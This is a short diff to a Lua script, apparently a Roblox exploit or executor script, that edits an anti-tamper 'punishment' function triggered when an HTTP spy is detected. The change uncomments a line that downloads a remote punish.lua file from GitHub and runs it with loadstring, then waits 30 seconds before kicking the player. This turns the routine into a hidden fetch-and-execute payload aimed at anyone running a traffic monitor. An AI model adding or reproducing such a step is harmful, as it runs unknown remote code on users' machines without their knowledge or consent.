@@ -18,8 +18,9 @@ local deb = false
 
 function punishment()
     if not deb then deb = true else return end
-    --loadstring(game:HttpGet(("https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/punish.lua")))()
-    game:GetService("Players").LocalPlayer:Kick("Http spy detected")
+    loadstring(game:HttpGet(("https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/punish.lua")))()
+    task.wait(30)
+	game:GetService("Players").LocalPlayer:Kick("Http spy detected")
 end
 
 local realHookFunction = clonefunction(hookfunction)
